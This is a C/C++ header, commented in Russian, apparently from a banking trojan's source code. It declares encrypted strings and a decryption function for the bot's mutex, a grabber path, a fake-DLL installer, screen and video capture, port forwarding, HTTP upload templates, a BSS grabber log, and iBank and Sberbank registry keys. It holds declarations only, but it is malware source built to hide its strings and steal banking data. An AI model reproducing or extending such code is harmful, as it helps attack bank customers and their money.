
//---------------------------------------------------------------------------
//  Модуль хранения строковыъ констант бота
//
//  Модифицирован: Июль 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//тип кодируемой строки, выравнивается в один байт
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - Функция расшифровывает строку EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  Публичное объявление строковых данных
//
//
//  Названия к наинаются с приставки EStr -
//  Encrypted String
//=====================================================

// Префикс глобального мьютекса сигнализирующего, что бот запущен
extern CSSTR StrBotGlobalMutexName[];



extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];

extern CSSTR StrPrefixFileName[];



// Перечень команд, которые может выполняь бот
extern CSSTR CommandInstallFakeDLL[];


// Имена файлов, для добавления в лог
extern CSSTR StrLogFileScreenShot[];
extern CSSTR StrLogFileInformation[];
extern CSSTR StrLogFileNetInfo[];



// Имена функций библиотеки видеозаписи.
extern CSSTR VideRecFuncRecordProcess[];
extern CSSTR VideRecFuncRecordWnd[];
extern CSSTR VideRecFuncStop[];
extern CSSTR VideRecFuncResetTimer[];
extern CSSTR VideRecFuncSendData[];
extern CSSTR VideRecFuncRunPortForward[];


// Константы модуля HTTP
extern CSSTR HTTPFormContentDisposition[];
extern CSSTR HTTPFormFieldName[]; // Шаблон формирования имени поля
extern CSSTR HTTPFormFileInfo[];  // Шаблон строки формирования информации о имени файла при отправке формы
extern CSSTR HTTPOctetStream[];


// Строки модуля AzConfig
extern CSSTR AzConfigParamUserName[];


// Строки модуля BSS грабера
extern CSSTR BSSLogTemplate[];


// Строки модуля FakeDllInstaller
extern CSSTR EStrFakeDllInstallerCommandParams[];
extern CSSTR EStrIBankRegistryPath[];
extern CSSTR EStrSberRegistryKey[];




//*********************************************************************
//                            Не шифрованные строки и данные
//*********************************************************************


extern CSSTR Slash[];
extern CSSTR SlashChar;



#endif
